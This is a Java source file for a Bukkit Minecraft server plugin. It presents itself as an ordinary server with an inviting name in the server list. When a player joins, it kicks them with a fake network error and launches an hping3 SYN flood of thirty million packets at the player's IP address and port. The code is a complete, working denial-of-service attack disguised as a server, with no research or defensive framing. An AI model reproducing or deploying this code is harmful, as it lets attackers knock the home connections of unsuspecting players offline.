package es.nkmem.da;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

public class CoolServer extends JavaPlugin implements Listener {
    private DDoSInterface dDoSInterface = new HPing3();
    private Set<String> current = Collections.synchronizedSet(new HashSet<>());

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onServerListPing(ServerListPingEvent event) {
        event.setMotd("The Coolest Server Ever");
        event.setMaxPlayers(42069);
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        event.getPlayer().kickPlayer("Internal Exception: io.netty.handler.codec.DecoderException");
        String[] parts = event.getPlayer().getAddress().toString().substring(1).split(":");
        String host = parts[0];
        if (current.add(host)) {
            getServer().getScheduler().runTaskAsynchronously(this,
                () -> dDoSInterface.ddos(host, Integer.parseInt(parts[1])));
        }
    }

    public interface DDoSInterface {
        void ddos(String host, int port);
    }

    public class HPing3 implements DDoSInterface {
        @Override
        public void ddos(String host, int port) {
            Process p;
            try {
                getLogger().info("Hitting off " + host + ":" + port);
                p = Runtime.getRuntime().exec(
                        String.format("hping3 -i u1 -S -p %d -c 30000000 %s", port, host)
                );
                p.waitFor();
                BufferedReader reader =
                        new BufferedReader(new InputStreamReader(p.getInputStream()));
                String output = "";
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\n";
                }
                current.remove(host);
                getLogger().info(output);
            } catch (Exception e) {
                getLogger().info(e.getClass().getName() + " with " + host + ":" + port);
            }
        }
    }
}
